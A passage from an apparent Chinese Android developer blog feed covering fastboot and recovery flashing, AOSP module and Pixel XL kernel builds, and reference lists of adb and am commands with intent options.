title="fastboot"></a>fastboot</h3><p>一、Fastboot</p><p>1.1 Recovery模式(卡刷)</p><p>在系统进行定制时，编译系统会编译出一份ZIP的压缩包，里面是一些系统分区镜像，提供给客户进行手动升级、恢复系统。需要提前将压缩包内置SDcard，在Recovery模式进行。</p><p>进入Recovery方法：将手机完全关机后，按住音量键下(上)+电源键，进入BootLoader界面。用音量加减来控制光标，电源键来进行确认(有的机器只能用音量下键进行选择，上键是确认键)。说明：有的机器可能没有预装Recovery。</p><p>1.2 Recovery模式(线刷)</p><p>在安卓手机中Fastboot是一种比Recovery更底层的刷机模式。使用USB数据线连接手机的一种刷机模式。这就是所谓的线刷，与Recovery模式相比Fastboot需要掌握一些烧机命令，对于某些系统卡刷来说，线刷更可靠，安全。</p><p>二、Android系统分区介绍</p><ul><li><p>bootloader     系统开机引导类似电脑BIOS，这块刷错手机就会<strong>变成砖</strong></p></li><li><p>radio     通讯模块、基带、WIFI、Bluetooth等衔接硬件的驱动软件</p></li><li><p>recovery     系统故障时负责恢复</p></li><li><p>boot     Linux嵌入式系统内核</p></li><li><p>system     系统文件、应用</p></li><li><p>cache     系统运行时产生的缓存</p></li><li><p>userdata     用户使用APP产生的缓存数据</p></li></ul><h3 id="模块编译介绍"><a href="#模块编译介绍" class="headerlink" title="模块编译介绍"></a>模块编译介绍</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#除了通过make命令编译可以整个android源码外,Google也为我们提供了相应的命令来支持单独模块的编译.</span><br><span class="hljs-comment">#编译环境初始化(即执行source build/envsetup.sh)之后,我们可以得到一些有用的指令,除了上边用到的lunch,还有以下:</span><br><br>  - croot: Changes directory to the top of the tree.<br>  - m: Makes <span class="hljs-keyword">from</span> the top of the tree.<br>  - mm: Builds <span class="hljs-built_in">all</span> of the modules <span class="hljs-keyword">in</span> the current directory.<br>  - mmm: Builds <span class="hljs-built_in">all</span> of the modules <span class="hljs-keyword">in</span> the supplied directories.<br>  - cgrep: Greps on <span class="hljs-built_in">all</span> local C/C++ files.<br>  - jgrep: Greps on <span class="hljs-built_in">all</span> local Java files.<br>  - resgrep: Greps on <span class="hljs-built_in">all</span> local res/*.xml files.<br>  - godir: Go to the directory containing a file.<br></code></pre></td></tr></table></figure><p>其中mmm指令就是用来编译指定目录.通常来说,每个目录只包含一个模块.比如这里我们要编译Launcher2模块,执行指令:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mmm packages<span class="hljs-regexp">/apps/</span>Launcher2/<br></code></pre></td></tr></table></figure><p>稍等一会之后,如果提示:</p><p>make completed success fully </p><p>即表示编译完成,此时在out/target/product/gereric/system/app就可以看到编译的Launcher2.apk文件了.</p><h3 id="重新打包系统镜像"><a href="#重新打包系统镜像" class="headerlink" title="重新打包系统镜像"></a>重新打包系统镜像</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">编译好指定模块后,如果我们想要将该模块对应的apk集成到系统镜像中,需要借助<span class="hljs-keyword">make</span> snod指令重新打包系统镜像,这样我们新生成的<span class="hljs-built_in">system</span>.img中就包含了刚才编译的Launcher2模块了.重启机器之后生效.<br></code></pre></td></tr></table></figure><h3 id="单独安装模块"><a href="#单独安装模块" class="headerlink" title="单独安装模块"></a>单独安装模块</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">我们在不断的修改某些模块,总不能每次编译完成后都要重新打包<span class="hljs-built_in">system</span>.img,然后重启手机吧?有没有什么简单的方法呢?<br>在编译完后,借助adb install命令直接将生成的apk文件安装到设备上即可,相比使用<span class="hljs-keyword">make</span> snod,会节省很多事件.<br></code></pre></td></tr></table></figure><h3 id="编译目录介绍"><a href="#编译目录介绍" class="headerlink" title="编译目录介绍"></a>编译目录介绍</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs out/target/product/generic/system```目录下的常用目录:"><br>- Android系统自带的apk文件都在```out/target/product/generic/system/apk```目录下<br>- 一些可执行文件(比如C编译的执行),放在```out/target/product/generic/system/bin```目录下<br>- 动态链接库放在```out/target/product/generic/system/lib```目录下<br>- 硬件抽象层文件都放在```out/targer/product/generic/system/lib/hw```目录下<br><br>### 源码目录介绍<br><br>![](https://img2020.cnblogs.com/blog/2275974/202101/2275974-20210109203736099-1901913006.png)<br><br><br>![](https://img2020.cnblogs.com/blog/2275974/202101/2275974-20210109203759902-672469351.png)<br><br><br>### lunch 后面的参数介绍<br><br></code></pre></td></tr></table></figure><p>lunch aosp_arm-eng</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><br>该命令表示针对模拟器进行完整编译，并且所有调试功能均处于启用状态。<br><br>如果您没有提供任何参数就运行命令，lunch 将提示您从菜单中选择一个目标。<br><br>所有编译目标都采用 BUILD-BUILDTYPE 形式，其中 BUILD 是表示特定功能组合的代号。<br><br>BUILDTYPE 是以下类型之一：<br><br><br>|<span class="hljs-string"> 编译类型  </span>|<span class="hljs-string"> 使用情况                                                     </span>|<br>|<span class="hljs-string"> --------- </span>|<span class="hljs-string"> ------------------------------------------------------------ </span>|<br>|<span class="hljs-string"> user      </span>|<span class="hljs-string"> 适用于生产环境                                               </span>|<br>|<span class="hljs-string"> userdebug </span>|<span class="hljs-string"> 与“user”类似，但具有 root 权限和可调试性；是进行调试时的首选编译类型 </span>|<br>|<span class="hljs-string"> eng       </span>|<span class="hljs-string"> eng具有额外调试工具的开发配置                            </span>|<br><br>![](https://img2020.cnblogs.com/blog/2275974/202101/2275974-20210109203911293-1939592244.png)<br><br><br>![](https://img2020.cnblogs.com/blog/2275974/202101/2275974-20210109204041185-295820055.png)<br><br><br><br> <span class="hljs-comment">### 单独刷入某个 img：</span><br><br>fastboot刷入命令格式：fastboot flash 系统分区 对应的name.img<br><br> ```shell<br>cd out/target/product/marlin<br>fastboot flash boot_a boot.img<br>fastboot flash boot_b boot.img<br>fastboot flash system system.img<br>fastboot flash system_b system_other.img<br>fastboot flash vendor vendor.img<br>fastboot flash userdata userdata.img<br>fastboot flash userdata data.img<br></code></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/wengliuhu/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">107979371</span> 源码目录介绍<br>https:<span class="hljs-regexp">//</span>developers.google.cn<span class="hljs-regexp">/android/im</span>ages<span class="hljs-comment">#marlin 官网刷机包，救砖</span><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/u012417380/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">73196722</span> lunch参数介绍<br>https:<span class="hljs-regexp">//</span>source.android.com<span class="hljs-regexp">/source/</span>building 官网刷机教程<br>https:<span class="hljs-regexp">//</span>www.dazhuanlan.com<span class="hljs-regexp">/2019/</span><span class="hljs-number">12</span><span class="hljs-regexp">/09/</span><span class="hljs-number">5</span>dedf04e496e7  Android8 分区表变化和相关信息<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
      <tag>rom</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pixel XL内核编译</title>
    <link href="/2021/08/22/pixel-XL%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91/"/>
    <url>/2021/08/22/pixel-XL%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91/</url>
    
    <content type="html"><![CDATA[<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ul><li>操作系统 ：虚拟机 ubuntu 16.04</li><li>内存 ：8G</li><li>硬盘 ：150G</li><li>CPU ：4核</li></ul><h2 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a>编译过程</h2><p>注： 编译环境见pixel XL源码编译</p><h3 id="1-源码分支获取"><a href="#1-源码分支获取" class="headerlink" title="1. 源码分支获取"></a>1. 源码分支获取</h3><p>根据手机型号选择分支名称</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>source.android.google.cn<span class="hljs-regexp">/setup/</span>build/building-kernels?hl=zh-cn<span class="hljs-comment">#customize-build</span><br></code></pre></td></tr></table></figure><p>Pixel XL的分支名称为android-msm-marlin-3.18-pie-qpr2</p> <img src="/2021/08/22/pixel-XL%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91/images/%E5%88%86%E6%94%AF%E5%90%8D%E7%A7%B0.png" class=""><h3 id="2-下载源码"><a href="#2-下载源码" class="headerlink" title="2. 下载源码"></a>2. 下载源码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#共4G文件需要梯子，挂个vpn 大约2个小时下完</span><br>mkdir android-kernel &amp;&amp; cd android-kernel<br><br>repo init -u https://android.googlesource.com/kernel/manifest -b android-msm-marlin-<span class="hljs-number">3.18</span>-pie-qpr2<br>repo sync<br></code></pre></td></tr></table></figure><h3 id="3-构建"><a href="#3-构建" class="headerlink" title="3. 构建"></a>3. 构建</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#构建aarch64的内核版本</span><br>./build/build.sh  BUILD_CONFIG=common/build.config.gki.aarch64<br></code></pre></td></tr></table></figure><p>注:此处可能会报错</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">build/buildinfo/buildinfo.py <span class="hljs-keyword">not</span> found<br></code></pre></td></tr></table></figure><p>编辑build.config,将EXTRA_CMDS=’python build/buildinfo/buildinfo.py’ 删除，实测可以编译成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">KERNEL_DIR=private/msm-google<br>. $&#123;ROOT_DIR&#125;/$&#123;KERNEL_DIR&#125;/build.config.common<br>POST_DEFCONFIG_CMDS=<span class="hljs-string">&quot;check_defconfig &amp;&amp; compression_tool_and_files lz4&quot;</span><br>EXTRA_CMDS=<span class="hljs-string">&#x27;python build/buildinfo/buildinfo.py&#x27;</span>      <span class="hljs-comment"># &lt;----删除此行</span><br>STOP_SHIP_TRACEPRINTK=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>编译成功后内核二进制文件、模块和相应的映像位于 out/android-msm-marlinxxxxx/dist 目录下。</p><h3 id="4-刷机"><a href="#4-刷机" class="headerlink" title="4. 刷机"></a>4. 刷机</h3><h4 id="4-1-临时刷入"><a href="#4-1-临时刷入" class="headerlink" title="4.1 临时刷入"></a>4.1 临时刷入</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#刷入out/xxx/Image.lz4-dtb </span><br><span class="hljs-comment">#临时有效，重启恢复之前内核</span><br><br>adb reboot bootloader<br>fastboot boot Image.lz4-dtb  <br></code></pre></td></tr></table></figure><h4 id="4-2-永久刷入"><a href="#4-2-永久刷入" class="headerlink" title="4.2 永久刷入"></a>4.2 永久刷入</h4><h5 id="4-2-1-拷贝内核文件到AOSP项目下"><a href="#4-2-1-拷贝内核文件到AOSP项目下" class="headerlink" title="4.2.1 拷贝内核文件到AOSP项目下"></a>4.2.1 拷贝内核文件到AOSP项目下</h5><p>将<code>out/xxx/Image.lz4-dtb</code> 拷贝到<code> device/google/marlin-kernel</code>下（以防万一拷贝之前备份<code>device/google/marlin-kernel/Image.lz4-dtb</code>）</p><h5 id="4-2-2-编译aosp"><a href="#4-2-2-编译aosp" class="headerlink" title="4.2.2  编译aosp"></a>4.2.2  编译aosp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">source build/envsetup.sh<br>lunch <span class="hljs-number">15</span>   <span class="hljs-comment">#根据机型选择不同版本</span><br>make bootimage<br></code></pre></td></tr></table></figure><h5 id="4-2-3-编译完成刷入系统"><a href="#4-2-3-编译完成刷入系统" class="headerlink" title="4.2.3 编译完成刷入系统"></a>4.2.3 编译完成刷入系统</h5><p>刷入/out/target/product/marlin/boot.img</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">fastboot flash boot boot.img<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
      <tag>rom</tag>
      
      <tag>内核</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>adb查看当前Activity</title>
    <link href="/2021/08/22/adb%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8DActivity/"/>
    <url>/2021/08/22/adb%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8DActivity/</url>
    
    <content type="html"><![CDATA[<h2 id="Android-8-1前"><a href="#Android-8-1前" class="headerlink" title="Android 8.1前"></a>Android 8.1前</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">adb <span class="hljs-keyword">shell</span> dumpsys activity | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;mFocus&quot;</span><br></code></pre></td></tr></table></figure><h2 id="Android-8-1-后"><a href="#Android-8-1-后" class="headerlink" title="Android 8.1 后"></a>Android 8.1 后</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">adb <span class="hljs-keyword">shell</span> dumpsys activity | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;mResume&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
      <tag>adb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>adb设置代理</title>
    <link href="/2021/08/22/adb%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/"/>
    <url>/2021/08/22/adb%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h2 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">adb shell settings put global http_proxy 127.0.0.1:8888<br></code></pre></td></tr></table></figure><h2 id="移除代理（需要重启）："><a href="#移除代理（需要重启）：" class="headerlink" title="移除代理（需要重启）："></a>移除代理（需要重启）：</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">adb shell settings delete global http_proxy<br><br>adb shell settings delete global global_http_proxy_host<br><br>adb shell settings delete global global_http_proxy_port<br><br>adb reboot<br></code></pre></td></tr></table></figure><h2 id="不重启移除代理"><a href="#不重启移除代理" class="headerlink" title="不重启移除代理:"></a>不重启移除代理:</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">adb shell settings put global http_proxy :0<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
      <tag>adb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>am常用命令</title>
    <link href="/2021/08/21/am%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2021/08/21/am%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h2 id="拨打电话10086"><a href="#拨打电话10086" class="headerlink" title="拨打电话10086"></a>拨打电话10086</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">adb shell am start -<span class="hljs-selector-tag">a</span> android<span class="hljs-selector-class">.intent</span><span class="hljs-selector-class">.action</span><span class="hljs-selector-class">.CALL</span> -d tel:<span class="hljs-number">10086</span><br></code></pre></td></tr></table></figure><h2 id="打开网址"><a href="#打开网址" class="headerlink" title="打开网址"></a>打开网址</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">adb shell am start -<span class="hljs-selector-tag">a</span> android<span class="hljs-selector-class">.intent</span><span class="hljs-selector-class">.action</span><span class="hljs-selector-class">.VIEW</span> -d  http:<span class="hljs-comment">//gityuan.com</span><br></code></pre></td></tr></table></figure><h2 id="启动Activity"><a href="#启动Activity" class="headerlink" title="启动Activity"></a>启动Activity</h2><p> 启动包名为<code>com.yuanhh.app</code>，主Activity为<code>.MainActivity</code>  且extra数据以”website”为key, “yuanh.com”为value</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">am</span> start -n <span class="hljs-keyword">com</span>.yuanhh.app/.MainActivity -es website gityuan.<span class="hljs-keyword">com</span><br></code></pre></td></tr></table></figure><h2 id="发送广播"><a href="#发送广播" class="headerlink" title="发送广播"></a>发送广播</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">adb shell am broadcast -a com.android.test <span class="hljs-params">--es</span> test_string <span class="hljs-string">&quot;this is test string&quot;</span> <span class="hljs-params">--ei</span> test_int 100 <span class="hljs-params">--ez</span> test_boolean <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>命令列表：</p><table><thead><tr><th align="left">命令</th><th align="left">功能</th><th align="left">实现方法</th></tr></thead><tbody><tr><td align="left">am start [options] <INTENT></td><td align="left">启动Activity</td><td align="left">startActivityAsUser</td></tr><tr><td align="left">am startservice <INTENT></td><td align="left">启动Service</td><td align="left">startService</td></tr><tr><td align="left">am stopservice <INTENT></td><td align="left">停止Service</td><td align="left">stopService</td></tr><tr><td align="left">am broadcast <INTENT></td><td align="left">发送广播</td><td align="left">broadcastIntent</td></tr><tr><td align="left">am kill <PACKAGE></td><td align="left">杀指定后台进程</td><td align="left">killBackgroundProcesses</td></tr><tr><td align="left">am kill-all</td><td align="left">杀所有后台进程</td><td align="left">killAllBackgroundProcesses</td></tr><tr><td align="left">am force-stop <PACKAGE></td><td align="left">强杀进程</td><td align="left">forceStopPackage</td></tr><tr><td align="left">am hang</td><td align="left">系统卡住</td><td align="left">hang</td></tr><tr><td align="left">am restart</td><td align="left">重启</td><td align="left">restart</td></tr><tr><td align="left">am bug-report</td><td align="left">创建bugreport</td><td align="left">requestBugReport</td></tr><tr><td align="left">am dumpheap <pid> <file></td><td align="left">进程pid的堆信息输出到file</td><td align="left">dumpheap</td></tr><tr><td align="left">am send-trim-memory <pid> <level></td><td align="left">收紧进程的内存</td><td align="left">setProcessMemoryTrimLevel</td></tr><tr><td align="left">am monitor</td><td align="left">监控</td><td align="left">MyActivityController.run</td></tr></tbody></table><p>am命令实的实现方式在Am.java，最终几乎都是调用<code>ActivityManagerService</code>相应的方法来完成的，<code>am monitor</code>除外。比如前面概述中介绍的命令<code>am start -a android.intent.action.VIEW -d http://gityuan.com</code>， 启动Acitivty最终调用的是ActivityManagerService类的startActivityAsUser()方法来完成的。再比如<code>am kill-all</code>命令，最终的实现工作是由ActivityManagerService的killBackgroundProcesses()方法完成的</p><h2 id="Options"><a href="#Options" class="headerlink" title="Options"></a>Options</h2><p>主要是启动Activity命令<code>am start [options] </code>使用options参数，接下来列举Activity命令的[options]参数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">-D: 允许调试功能<br>-W: 等待app启动完成<br>-R &lt;COUNT&gt;: 重复启动Activity COUNT次<br>-S: 启动activity之前，先调用forceStopPackage()方法强制停止app.<br>–opengl-trace: 运行获取OpenGL函数的trace<br>–user &lt;USER_ID&gt; | current: 指定用户来运行App,默认为当前用户。<br>–start-profiler &lt;FILE&gt;: 启动profiler，并将结果发送到 &lt;FILE&gt;;<br>-P &lt;FILE&gt;: 类似 –start-profiler，不同的是当app进入idle状态，则停止profiling<br>–sampling INTERVAL: 设置profiler 取样时间间隔，单位ms;<br></code></pre></td></tr></table></figure><p>启动Activity的实现原理： 存在-W参数则调用startActivityAndWait()方法来运行，否则startActivityAsUser()。</p><h2 id="收紧内存"><a href="#收紧内存" class="headerlink" title="收紧内存"></a>收紧内存</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">am</span> send-trim-memory  <span class="hljs-symbol">&lt;pid&gt;</span> <span class="hljs-symbol">&lt;level&gt;</span><br></code></pre></td></tr></table></figure><p>例如： 向pid=12345的进程，发出level=RUNNING_LOW的收紧内存命令</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">am send-<span class="hljs-keyword">trim</span>-<span class="hljs-keyword">memory</span> <span class="hljs-number">12345</span> RUNNING_LOW。<br></code></pre></td></tr></table></figure><p>那么level取值范围为： HIDDEN、RUNNING_MODERATE、BACKGROUND、RUNNING_LOW、MODERATE、RUNNING_CRITICAL、COMPLETE。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>对于am的子命令，startservice, stopservice, broadcast, kill, profile start, profile stop, dumpheap的可选参数都允许设置<code>--user </code>。目前市面上的绝大多数手机还是单用户模式，故可以忽略该参数，默认为当前用户。</p><p>例如：启动id=10010的用户的指定service。</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">am startservice --<span class="hljs-keyword">user</span> <span class="hljs-title">10010</span><br></code></pre></td></tr></table></figure><h2 id="Intent"><a href="#Intent" class="headerlink" title="Intent"></a>Intent</h2><p>Intent的参数和flags较多，分为3种类型参数，常用参数，Extra参数，Flags参数</p><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><ul><li><code>-a </code>: 指定Intent action， 实现原理Intent.setAction()；</li><li><code>-n </code>: 指定组件名，格式为{包名}/.{主Activity名}，实现原理Intent.setComponent(）；</li><li><code>-d </code>: 指定Intent data URI</li><li><code>-t </code>: 指定Intent MIME Type</li><li> <code>-c &lt;CATEGORY&gt; [-c &lt;CATEGORY&gt;] ...]:</code>:指定Intent category，实现原理Intent.addCategory()</li><li><code>-p </code>: 指定包名，实现原理Intent.setPackage();</li><li><code>-f </code>: 添加flags，实现原理Intent.setFlags(int )，紧接着的参数必须是int型；</li></ul><p>实例</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">am start -<span class="hljs-selector-tag">a</span> android<span class="hljs-selector-class">.intent</span><span class="hljs-selector-class">.action</span><span class="hljs-selector-class">.VIEW</span><br>am start -n com<span class="hljs-selector-class">.yuanhh</span>.app/<span class="hljs-selector-class">.MainActivity</span><br>am start -d <span class="hljs-attribute">content</span>://contacts/people/<span class="hljs-number">1</span><br>am start -t image/png<br>am start -c android<span class="hljs-selector-class">.intent</span><span class="hljs-selector-class">.category</span>.APP_CONTACTS<br></code></pre></td></tr></table></figure><h3 id="Extra参数"><a href="#Extra参数" class="headerlink" title="Extra参数"></a>Extra参数</h3><h4 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h4><table><thead><tr><th>参数</th><th>-e/-es</th><th>-esn</th><th>-ez</th><th>-ei</th><th>-el</th><th>-ef</th><th>-eu</th><th>-ecn</th></tr></thead><tbody><tr><td>类型</td><td>String</td><td>(String)null</td><td>boolean</td><td>int</td><td>long</td><td>float</td><td>uri</td><td>component</td></tr></tbody></table><p>比如参数es是Extra String首字母简称，实例：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">am</span> start -n <span class="hljs-keyword">com</span>.yuanhh.app/.MainActivity -es website gityuan.<span class="hljs-keyword">com</span><br></code></pre></td></tr></table></figure><p>此处<code>-es website gityuan.com</code>，等价于Intent.putExtra(“website”, “gityuan.com”);</p><h4 id="数组类型"><a href="#数组类型" class="headerlink" title="数组类型"></a>数组类型</h4><table><thead><tr><th>参数</th><th>-esa</th><th>-eia</th><th>-ela</th><th>-efa</th></tr></thead><tbody><tr><td>数组类型</td><td>String[]</td><td>int[]</td><td>long[]</td><td>float[]</td></tr></tbody></table><p>比如参数eia，是Extra int array首字母简称，多个value值之间以逗号隔开.。</p><p>实例：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">am</span> start -n com.yuanhh.app/.MainActivity -ela weekday <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><p>此处<code>-ela weekday 1,2,3,4,5</code>，等价于Intent.putExtra(“weekday”, new int[]{1,2,3,4,5});</p><h4 id="ArrayList类型"><a href="#ArrayList类型" class="headerlink" title="ArrayList类型"></a>ArrayList类型</h4><table><thead><tr><th>参数</th><th>-esal</th><th>-eial</th><th>-elal</th><th>-efal</th></tr></thead><tbody><tr><td>List类型</td><td>String</td><td>int</td><td>long</td><td>float</td></tr></tbody></table><p>比如参数efal，是Extra float Array List首字母简称，多个value值之间以逗号隔开。</p><p>实例：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">am</span> start -n com.yuanhh.app/.MainActivity -efal nums <span class="hljs-number">1</span>.<span class="hljs-number">2</span>,<span class="hljs-number">2</span>.<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>此处<code>-efal nums 1.2,2.2</code>，等价于先构造ArrayList变量，再通过putExtra放入第二个参数。</p><h3 id="Flags参数"><a href="#Flags参数" class="headerlink" title="Flags参数"></a>Flags参数</h3><p>在参数类型1中，提到有<code>-f </code>，是通过<code>Intent.setFlags(int )</code>方法，来设置Intent的flags.本小节也是关于flags，是通过<code>Intent.addFlags(int )</code>方法。如下所示，所有的flags参数。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs json">[--grant-read-uri-permission] [--grant-write-uri-permission]<br>[--grant-persistable-uri-permission] 